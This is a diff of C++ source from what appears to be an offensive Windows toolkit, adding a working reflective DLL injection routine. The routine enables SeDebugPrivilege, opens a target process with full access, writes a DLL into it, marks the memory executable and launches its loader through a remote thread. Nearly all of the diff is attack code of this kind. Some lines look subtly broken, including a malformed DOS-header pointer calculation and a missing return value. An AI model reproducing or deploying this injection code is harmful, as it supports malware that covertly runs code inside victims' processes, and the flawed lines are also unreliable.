@@ -1,9 +1,95 @@
 #include "core/technique.hpp"
 
+// Reference:
+// https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/LoadLibraryR.c
+namespace Technique::Injection::Helper
+{
+    DWORD Rva2Offset(DWORD dwRva, UINT_PTR uBaseAddr)
+    {            
+        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew);
+        PIMAGE_SECTION_HEADER pSecHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);
+
+        if(dwRva < pSecHeader[0].PointerToRawData)
+            return dwRva;
+
+        WORD wIndex = 0;
+        for(wIndex=0 ; wIndex < pNtHeaders->FileHeader.NumberOfSections ; wIndex++)
+        {   
+            if(
+                dwRva >= pSecHeader[wIndex].VirtualAddress &&
+                dwRva < (pSecHeader[wIndex].VirtualAddress + pSecHeader[wIndex].SizeOfRawData)
+            ) {
+                return (dwRva - pSecHeader[wIndex].VirtualAddress + pSecHeader[wIndex].PointerToRawData);
+            }
+        }
+        
+        return 0;
+    }
+
+    DWORD GetFuncOffset(LPVOID lpBuffer, LPCSTR lpFuncName)
+    {
+        #ifdef _WIN64
+            DWORD dwCompiledArch = 2;
+        #else
+            DWORD dwCompiledArch = 1;
+        #endif
+
+        UINT_PTR uBaseAddr   = (UINT_PTR)lpBuffer;
+        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(uBaseAddr + (PIMAGE_DOS_HEADER)uBaseAddr);
+        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew);
+        
+        if (pNtHeaders->OptionalHeader.Magic == 0x010B) // PE32
+        {
+            if (dwCompiledArch != 1)
+                return 0;
+        }
+        else if (pNtHeaders->OptionalHeader.Magic == 0x020B) // PE64
+        {
+            if (dwCompiledArch != 2)
+                return 0;
+        }
+        else
+        {
+            return 0;
+        }
+
+        UINT_PTR uTemp = (UINT_PTR)&(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
+        PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uBaseAddr + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uTemp)->VirtualAddress, uBaseAddr));
+
+        UINT_PTR uNames          = uBaseAddr + Rva2Offset(pExportDir->AddressOfNames, uBaseAddr);
+        UINT_PTR uNameOrdinals   = uBaseAddr + Rva2Offset(pExportDir->AddressOfNameOrdinals, uBaseAddr);
+        UINT_PTR uAddresses      = uBaseAddr + Rva2Offset(pExportDir->AddressOfFunctions, uBaseAddr);
+
+        DWORD dwCounter = pExportDir->NumberOfNames;
+
+        while (dwCounter--)
+        {
+            char* cExportedFuncName = (char*)(uBaseAddr + Rva2Offset(DEREF_32(uNames), uBaseAddr));
+
+            if (strcmp(cExportedFuncName, lpFuncName) == 0)
+            {
+                uAddresses = uBaseAddr + Rva2Offset(pExportDir->AddressOfFunctions, uBaseAddr);
+                uAddresses += (DEREF_16(uNameOrdinals) * sizeof(DWORD));
+
+                return Rva2Offset(DEREF_32(uAddresses), uBaseAddr);
+            }
+
+            uNames += sizeof(DWORD);
+            uNameOrdinals += sizeof(WORD);
+        }
+
+        return 0;
+    }
+}
+
 namespace Technique::Injection
 {
-    BOOL DLLInjection(Procs::PPROCS pProcs, DWORD dwPID, LPVOID lpDllPath, size_t dwDllPathSize)
-    {
+    BOOL DLLInjection(
+        Procs::PPROCS   pProcs,
+        DWORD           dwPID,
+        LPVOID          lpDllPath,
+        size_t          dwDllPathSize
+    ) {
         HANDLE hProcess;
         HANDLE hThread;
         LPVOID lpRemoteBuffer;
@@ -94,124 +180,103 @@ namespace Technique::Injection
         return TRUE;
     }
 
-    // Reference:
-    // https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
-    // WARN: Currently not working.
-    BOOL ReflectiveDLLInjection(Procs::PPROCS pProcs, LPCWSTR lpDllPath, size_t dwDllPathSize)
-    {
-        using LPPROC_DLLMAIN = BOOL(WINAPI*)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
+    BOOL ReflectiveDLLInjection(
+        Procs::PPROCS   pProcs,
+        DWORD           dwPID,
+        LPCWSTR         lpDllPath
+    ) {
+        std::vector<BYTE> bytes = System::Fs::FileRead(pProcs, lpDllPath);
+        LPVOID lpBuffer = bytes.data();
+        SIZE_T dwLength = bytes.size();
 
-        // Get this module's image base address
-        PVOID imageBase = GetModuleHandleA(NULL);
-
-        // Read DLL file and load it into memory
-        HANDLE hDLL = CreateFileW(
-            lpDllPath,
-            GENERIC_READ,
-            0,
-            NULL,
-            OPEN_EXISTING,
-            0,
-            NULL
-        );
-        DWORD dwDllSize = GetFileSize(hDLL, NULL);
-        LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDllSize);
-        DWORD outSize = 0;
-        ReadFile(hDLL, dllBytes, dwDllSize, &outSize, NULL);
-
-        // Get pointers to in-memory DLL headers
-        PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
-        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
-        SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
-
-        // Allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address,
-        LPVOID dllBase = VirtualAlloc(
-            (LPVOID)ntHeaders->OptionalHeader.ImageBase,
-            dllImageSize,
-            MEM_RESERVE | MEM_COMMIT,
-            PAGE_EXECUTE_READWRITE
-        );
-
-        // Get delta between this module's image base and the DLL that was read into memory
-        DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
-
-        // Copy over DLL image headers to the newly allocated space for the DLL
-        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
-        for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-            LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
-            LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
-            memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
-            section++;
-        }
-
-        // Perform image base relocation
-        IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-        DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
-        DWORD relocationsProcessed = 0;
-
-        while (relocationsProcessed < relocations.Size)
+        HANDLE hToken;
+        TOKEN_PRIVILEGES priv = {0};
+        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
         {
-            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
-            relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
-            DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
-            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
+            priv.PrivilegeCount = 1;
+            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-            for (DWORD i = 0; i < relocationsCount; i++) {
-                relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
+            if (LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+                AdjustTokenPrivileges(hToken, FALSE, &priv, 0, nullptr, nullptr);
 
-                if (relocationEntries[i].Type == 0) {
-                    continue;
-                }
-                
-                DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
-                DWORD_PTR addressToPatch = 0;
-                ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
-                addressToPatch += deltaImageBase;
-                memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
-            }
+            CloseHandle(hToken);
         }
 
-        // Resolve import address table
-        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
-        IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-        importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
-        LPCSTR libraryName = "";
-        HMODULE hLibrary = NULL;
+        HANDLE hProcess = System::Process::ProcessOpen(
+            pProcs,
+            dwPID,
+            PROCESS_ALL_ACCESS
+        );
+        if (!hProcess)
+            return FALSE;
 
-        while (importDescriptor->Name != 0) {
-            libraryName = (LPCSTR)((PBYTE)(dllBase) + importDescriptor->Name);
-            hLibrary = LoadLibraryA(libraryName);
-
-            if (hLibrary) {
-                PIMAGE_THUNK_DATA thunk = NULL;
-                thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);
-
-                while (thunk->u1.AddressOfData != 0) {
-                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
-                    {
-                        LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
-                        thunk->u1.Function = (DWORD_PTR)GetProcAddress(hLibrary, functionOrdinal);
-                    }
-                    else
-                    {
-                        PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
-                        DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(hLibrary, functionName->Name);
-                        thunk->u1.Function = functionAddress;
-                    }
-                    ++thunk;
-                }
-            }
-
-            importDescriptor++;
+        // Get offset of the ReflectiveDllLoader function in the DLL.
+        DWORD dwRefLoaderOffset = Technique::Injection::Helper::GetFuncOffset(lpBuffer, "ReflectiveDllLoader");
+        if (dwRefLoaderOffset == 0)
+        {
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
         }
 
-        // Execute the loaded DLL
-        LPPROC_DLLMAIN lpDLLMain = reinterpret_cast<LPPROC_DLLMAIN>((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
-        (*lpDLLMain)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);
+        // Allocate memory
+        LPVOID lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
+            pProcs,
+            hProcess,
+            dwLength,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+        if (!lpRemoteBuffer)
+        {
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
 
-        CloseHandle(hDLL);
-        HeapFree(GetProcessHeap(), 0, dllBytes);
+        // Write buffer to the allocated space
+        SIZE_T dwNumberOfWritten;
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
+            hProcess,
+            lpRemoteBuffer,
+            lpBuffer,
+            dwLength,
+            &dwNumberOfWritten
+        ) || dwNumberOfWritten != dwLength) {
+            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
 
-        return TRUE;
+        // Set PAGE_EXECUTE_READWRITE protection.
+        DWORD dwOldProtect = PAGE_READWRITE;
+        if (!System::Process::VirtualMemoryProtect(
+            pProcs,
+            hProcess,
+            &lpRemoteBuffer,
+            &dwLength,
+            PAGE_EXECUTE_READWRITE,
+            &dwOldProtect
+        )) {
+            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+            
+        LPTHREAD_START_ROUTINE lpRefLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteBuffer + dwRefLoaderOffset);
+
+        HANDLE hThread = System::Process::RemoteThreadCreate(
+            pProcs,
+            hProcess,
+            lpRefLoader,
+            nullptr
+        );
+        if (hThread)
+        {
+            System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr);
+        }
+
+        System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
+        System::Handle::HandleClose(pProcs, hProcess);
+        System::Handle::HandleClose(pProcs, hThread);
     }
 }
